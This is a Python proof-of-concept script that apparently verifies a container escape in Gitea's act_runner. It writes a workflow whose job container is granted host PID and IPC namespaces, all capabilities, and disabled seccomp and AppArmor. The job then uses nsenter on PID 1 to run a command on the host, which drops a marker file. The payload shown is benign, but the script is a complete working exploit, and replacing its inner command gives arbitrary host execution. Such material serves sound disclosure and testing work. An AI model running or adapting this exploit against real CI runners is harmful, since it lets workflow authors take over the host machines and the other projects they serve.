#!/usr/bin/env python3
import argparse
import os
import pathlib
import re
import shutil
import shlex
import subprocess
import sys
import tempfile
import textwrap


DEFAULT_OPTIONS = "--pid=host --ipc=host --cap-add=ALL --security-opt seccomp=unconfined --security-opt apparmor=unconfined"
DEFAULT_MARKER = "/tmp/gitea_act_runner_container_options_poc_marker"
SUCCESS_TOKEN = "gitea-act-runner-container-options-poc-ok"


def parser():
    p = argparse.ArgumentParser(
        description="Local marker-only PoC for Gitea act_runner workflow container.options host namespace escape."
    )
    p.add_argument("--runner", default="act_runner", help="Path to the act_runner binary.")
    p.add_argument("--image", default="ubuntu:22.04", help="Linux image used for the job container.")
    p.add_argument("--marker", default=DEFAULT_MARKER, help="Absolute Linux host marker path to create.")
    p.add_argument("--workdir", default="", help="Directory for the generated workflow. Defaults to a temporary directory.")
    p.add_argument("--keep-workdir", action="store_true", help="Keep the generated workflow directory.")
    p.add_argument("--timeout", type=int, default=180, help="act_runner exec timeout in seconds.")
    p.add_argument("--debug", action="store_true", help="Run act_runner with --debug.")
    p.add_argument("--pull", action="store_true", help="Ask act_runner to pull the container image.")
    return p


def validate_marker(marker):
    if not marker.startswith("/"):
        raise SystemExit("marker must be an absolute Linux path")
    if not re.fullmatch(r"[A-Za-z0-9._/\-]+", marker):
        raise SystemExit("marker contains unsupported characters")
    if marker in {"/", "/tmp", "/var/tmp"}:
        raise SystemExit("marker must be a file path")


def write_workflow(root, marker, image):
    workflows = root / ".gitea" / "workflows"
    workflows.mkdir(parents=True, exist_ok=True)
    marker_q = shlex.quote(marker)
    inner = f"id > {marker_q}; echo {shlex.quote(SUCCESS_TOKEN)} >> {marker_q}"
    command = f"nsenter -t 1 -m -u -i -n -p -- sh -c {shlex.quote(inner)}"
    workflow = f"""
name: gitea-act-runner-container-options-poc

on:
  - push

jobs:
  breakout:
    runs-on: ubuntu-latest
    container:
      image: {image}
      options: >-
        {DEFAULT_OPTIONS}
    steps:
      - name: host namespace marker
        run: |
          set -eu
          {command}
"""
    path = workflows / "poc.yml"
    path.write_text(textwrap.dedent(workflow).lstrip(), encoding="utf-8")
    return path


def run(args, root):
    cmd = [
        args.runner,
        "exec",
        "-C",
        str(root),
        "-W",
        str(root / ".gitea" / "workflows"),
        "-j",
        "breakout",
        "--container-daemon-socket=-",
        "--image",
        args.image,
    ]
    if args.pull:
        cmd.append("--pull")
    if args.debug:
        cmd.append("--debug")
    print("[*] running:", " ".join(shlex.quote(x) for x in cmd), flush=True)
    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=args.timeout,
        check=False,
    )


def read_marker(marker):
    try:
        return pathlib.Path(marker).read_text(encoding="utf-8", errors="replace")
    except FileNotFoundError:
        return ""
    except PermissionError as exc:
        raise SystemExit(f"marker exists but cannot be read: {exc}") from exc


def remove_marker(marker):
    try:
        pathlib.Path(marker).unlink()
    except FileNotFoundError:
        pass
    except PermissionError:
        pass


def main():
    args = parser().parse_args()
    validate_marker(args.marker)
    runner = shutil.which(args.runner) if os.path.basename(args.runner) == args.runner else args.runner
    if not runner:
        raise SystemExit("act_runner binary was not found; pass --runner /path/to/act_runner")
    args.runner = runner

    remove_marker(args.marker)
    temp = None
    if args.workdir:
        root = pathlib.Path(args.workdir).resolve()
        root.mkdir(parents=True, exist_ok=True)
    else:
        temp = tempfile.TemporaryDirectory(prefix="gitea-act-runner-poc-")
        root = pathlib.Path(temp.name)

    workflow = write_workflow(root, args.marker, args.image)
    print(f"[*] generated workflow: {workflow}", flush=True)

    try:
        result = run(args, root)
    finally:
        if temp and args.keep_workdir:
            temp.cleanup = lambda: None

    print(result.stdout, end="")
    marker = read_marker(args.marker)
    if result.returncode != 0:
        raise SystemExit(f"act_runner exited with {result.returncode}")
    if SUCCESS_TOKEN not in marker:
        raise SystemExit("marker was not created; host namespace entry was not verified")
    print("[+] verified host marker:")
    print(marker, end="" if marker.endswith("\n") else "\n")


if __name__ == "__main__":
    main()
